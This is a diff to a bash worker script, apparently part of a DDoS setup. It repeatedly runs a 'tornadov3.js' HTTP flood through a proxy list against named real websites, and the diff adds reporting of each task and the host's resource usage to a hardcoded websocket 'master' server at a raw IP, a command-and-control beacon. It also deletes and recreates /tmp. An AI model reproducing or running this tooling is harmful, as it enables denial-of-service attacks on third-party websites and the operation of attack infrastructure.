@@ -11,17 +11,30 @@ wait_between_targets=3
 wait_between_loops=3
 running=true
 
+WS_SERVER="ws://38.14.254.58:11451"
+
 # ------------------- 信号捕获 -------------------
 trap 'echo "🛑 捕获中断，终止中..."; running=false; pkill -TERM -g $$; exit 0' SIGINT
 
 # ------------------- 工具函数 -------------------
+get_cpu_usage() {
+    top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}'
+}
+
 get_mem_usage() {
     free | awk '/Mem:/ { printf("%.0f", $3/$2 * 100.0) }'
 }
 
+
 get_disk_usage() {
     df / | awk 'NR==2 {print $5}' | sed 's/%//'
 }
+
+get_network_usage() {
+    result=$(ifstat -t 1 1 | awk 'NR>2 {print "Download: " $2 " KB/s, Upload: " $3 " KB/s"}')
+    echo "$result"
+}
+
 
 free_memory() {
     echo "[$(date +'%Y-%m-%d %H:%M:%S')] ⚠️ 清理内存与 swap..."
@@ -35,18 +48,30 @@ free_memory() {
 clean_large_logs() {
     echo "[$(date +'%Y-%m-%d %H:%M:%S')] 🗑 清理tmp..."
     rm -rf /tmp
-    mkdir /tmp 
+    mkdir /tmp
     chmod 777 /tmp
+}
+
+send_to_master() {
+    message_type="$1"
+    cmd="$2"
+    cpu_usage="$3"
+    mem_usage="$4"
+    network_usage="$5"
+    if [ -n "$cmd" ]; then
+        json_message=$(printf '{"message_type": "%s", "cmd": "%s", "cpu_usage": "%s", "mem_usage": "%s", "network_usage": "%s"}' \
+                              "$message_type" "$cmd" "$cpu_usage" "$mem_usage" "$network_usage")
+        echo "$json_message" | websocat "$WS_SERVER"
+    fi
 }
 
 # ------------------- 任务批次 -------------------
 day_commands=(
-    "node tornadov3.js GET 'https://kode24.co.kr/' 120 100 64 proxy.txt --query 1 --debug"
+    "1"
 )
 
-
 night_commands=(
-    "node tornadov3.js GET 'https://int-legal-assist.com/' 120 100 64 proxy.txt --query 1 --debug"
+    "2"
 )
 
 # ------------------- 主循环 -------------------
@@ -81,6 +106,11 @@ while $running; do
 
         clean_name=$(echo "$cmd" | grep -oP "(https?://[^/]+)" | sed 's~https\?://~~; s~/~-~g')
         log_file="${log_dir}/${clean_name}.log"
+        cpu_usage=$(get_cpu_usage)
+        mem_usage=$(get_mem_usage)
+        network_usage=$(get_network_usage)
+
+        send_to_master "任务开始" "$cmd" "$cpu_usage" "$mem_usage" "$network_usage"
 
         echo "[$(date +'%Y-%m-%d %H:%M:%S')] ▶️ 执行 $cmd" | tee -a "$log_file"
 
@@ -92,6 +122,7 @@ while $running; do
         if ! $running; then echo "🚪 中断退出中..."; exit 0; fi
 
         echo "[$(date +'%Y-%m-%d %H:%M:%S')] ✅ 完成: $cmd，休息 ${wait_between_targets}s" | tee -a "$log_file"
+
         sleep "$wait_between_targets"
     done
 
